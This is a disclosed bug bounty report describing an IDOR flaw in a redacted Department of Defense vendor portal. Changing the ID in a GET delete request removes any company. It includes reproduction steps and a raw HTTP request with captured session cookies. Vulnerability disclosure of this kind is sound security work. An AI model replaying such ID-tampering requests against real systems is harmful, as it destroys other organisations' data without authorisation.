# IDOR on ███████ [HtUS]

## Report Details
- **Report ID**: 1627974
- **URL**: https://hackerone.com/reports/1627974
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-07-06T14:01:51.538Z
- **Disclosed**: 2022-11-18T18:36:03.621Z

## Reporter
- **Username**: nightm4re
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hello,
I have found an endpoint in ███ is vulnerable to IDOR which leads an attacker to brute-force an delete Companies

Steps to reproduce:

1. Nevgaite to https://███████/████/Reception/Vendor and create account
2. Once you created an account go to https://████/████/Vendor/Companies
3. Regsiter a new company and fill up the form
4. Go back to the coampy page
5. you will see delete button click on it and make sure your burp suite is on in the background
6. You will see the following request
7. Change the last ID to any id and forward the request

GET /██████/Vendor/Companies/Delete/71712 HTTP/1.1
Host: ██████████
Cookie: .AspNetCore.Antiforgery.wZhPOrJ1UhI=CfDJ8MjAkyuL42ZLvTS4QqhXIjcDfSsIAOTqNw3dZo7qYbVzZnw8UQEQCf3hh23v5DGfiTHk6RPBj78d2yWeZSN20treUhl3TWr-1iRZOXSdLEIcB0Q-4g__L40JFV9QUfNFSjfOBJge4W9QDQLC73_QuBU; .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8MjAkyuL42ZLvTS4QqhXIjdAocqm48zYIvTJWNKWyoyFlusz3T2dhYqL1474uivQT9BFajY3Fkt507twZdX1k8QgApfwX3BSGw20PBIsVj7SS-6jl0wmOPaE6t_UKsrjYZKu8ky-IDSml2MEvCT4ep9Sti2DJ1eXue7V3RbxhUrZuxraUlMmB4LHYy_dUbCB8N4pmmQW4IY5MXvpK3_3wb4; .AspNetAuth=CfDJ8MjAkyuL42ZLvTS4QqhXIje31_l_350wZ7JvbGgNdyQqyIfdUILQ7jE5dbdP8eKXY7FR06RxRWeUb548XmS03ZuIqH8ZshikVOdOm0rPGh2i1vSTIdxijSIuV6VbsE6pAK4ULe46jo0L9L5C2QL2gMnNbN7SWDcyhMylwHW4ZQirWTu3jTAqZcMrsMPReO1EAO4ey6cwHHgzO8Z1otRJrSCRsr-4ncOirQQyfDiulSAFm3srtWPcSRsy4tmv_7J2_Ra8vTyRZ146PvgCjXO0CaevtF6QSW41Gh5AycJ9GO4uoVkgIopdHHuXk8WMZx-lzA; ASP.NET_SessionId=pklok0cmwkw155fz2qihhuof; CSRF-TOKEN=CfDJ8MjAkyuL42ZLvTS4QqhXIjc4RkI6tGtAePHe0ChJXV8mHztZTjfBLYSr4Rosah2ZcjzZJHzPkJW-mgQadn6kRMdPYmvc6dS_eLCcg2Ds2sQxg4spttICndggqjzv0fdWJOotEnIJtHqSWUE8knNuMK4; .AspNetCore.Session=CfDJ8MjAkyuL42ZLvTS4QqhXIjc4G3A8xAtZ%2BpqcbCXYKgoRuTDdMZ2gEwK9U21D8bYrwu05ry0HgQI4szG5LJTcggrXqQyNsecWIUhCpfpq2Xo3b%2BAlMj9IhrPxE0yJ3VuYHcftrXnDA%2F3asi6SHe1sZbFuLX1Nbz6Tvmchqu30vE1b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://████████/██████████/Vendor/Companies
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

## Impact

An attacker can delete all companies

## Attachments
No attachments
